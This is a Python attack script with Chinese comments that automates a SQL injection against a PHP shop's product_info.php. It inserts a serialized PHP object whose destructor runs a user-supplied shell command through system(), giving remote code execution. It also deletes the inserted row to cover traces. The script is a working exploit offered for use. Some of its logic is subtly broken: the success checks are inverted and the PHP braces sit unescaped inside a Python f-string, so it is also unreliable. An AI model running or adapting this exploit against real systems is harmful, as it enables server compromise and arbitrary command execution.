import argparse
import requests
import base64
import subprocess

# 功能模組

# 步驟 2: 利用 SQL Injection 插入惡意資料
def inject_payload(target_url, encoded_payload, cookies=None):
    injection_url = f"{target_url}?page=product_info.php&id=1;"
    injection_payload = (
        f"INSERT INTO products (name, description, category, price, attributes) "
        f"VALUES ('evil3', 'evil', 'evil', 0.00, FROM_BASE64('{encoded_payload}'))"
    )
    response = requests.get(injection_url + injection_payload, cookies=cookies)
    if response.status_code != 200:
        print("[+] Payload Injected Successfully!")
    else:
        print("[-] Injection Failed!")
    return response.status_code == 200

# 步驟 3: 構造觸發 URL 執行指令
def trigger_payload(target_url, product_id, cookies=None):
    trigger_url = f"{target_url}?page=product_info.php&id={product_id}"
    response = requests.get(trigger_url, cookies=cookies)
    if response.status_code != 200:
        print("[+] Payload Triggered Successfully!")
        #print(response.text)
    else:
        print("[-] Trigger Failed!")
    return response

# 步驟 4: 刪除惡意資料
def delete_payload(target_url, product_name="evil3", cookies=None):
    delete_url = f"{target_url}?page=product_info.php&id=1;"
    delete_payload = f"DELETE FROM products WHERE name='{product_name}'"
    response = requests.get(delete_url + delete_payload, cookies=cookies)
    if response.status_code == 200:
        print("[+] Malicious Payload Deleted Successfully!")
    else:
        print("[-] Deletion Failed!")
    return response.status_code == 200

# 主程式入口
if __name__ == "__main__":
    # 命令列參數解析
    parser = argparse.ArgumentParser(description="Automate an attack sequence with SQL Injection and RCE.")
    parser.add_argument("-u", "--url", required=True, help="Target URL of the application.")
    parser.add_argument("-c", "--cmd", required=True, help="Remote command to execute.")
    parser.add_argument("-cookie", "--cookie", help="Cookie string to include in requests.")
    parser.add_argument("-id", "--id", required=True, help="URL id that triggered the Remote command")
    args = parser.parse_args()

    # 提取參數
    TARGET_URL = args.url
    REMOTE_CMD = args.cmd
    COOKIES = None
    if args.cookie:
        COOKIES = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in args.cookie.split('; ')}
    product_id = 6
    if args.id:
        product_id = args.id

    print("[*] Starting Attack Automation...")

    # 輸入自定義的 `curl` 指令部分
    custom_curl_command = REMOTE_CMD

    # 動態生成 PHP 程式碼
    php_code = f"""
    <?php
    class ApiTester {
        public $ip;
        private $res = "' && {custom_curl_command} && echo'";

        public function __construct($ip) {
            $this->ip = $ip;
        }

        public function __invoke() {
            $this->res = system("ping " . $this->ip);
        }

        public function __destruct() {
            system("echo '" . $this->res . "' > C:/logs/test.log");
        }   
    }
    $api = new ApiTester('127.0.0.1');
    $payload = base64_encode(serialize($api));
    echo $payload;
    """

    # 將 PHP 程式碼保存到臨時文件
    with open("temp_script.php", "w") as file:
        file.write(php_code)

    # 執行 PHP 文件
    result = subprocess.run(['php', 'temp_script.php'], capture_output=True, text=True)

    # 獲取輸出
    print("PHP Output:", result.stdout)


    # 1. 創建序列化資料並編碼
    payload = result.stdout
    print(payload)
    # 2. 插入惡意資料
    inject_payload(TARGET_URL, payload, cookies=COOKIES)
                
    # 3. 觸發執行
    #trigger_payload(TARGET_URL, product_id, cookies=COOKIES)


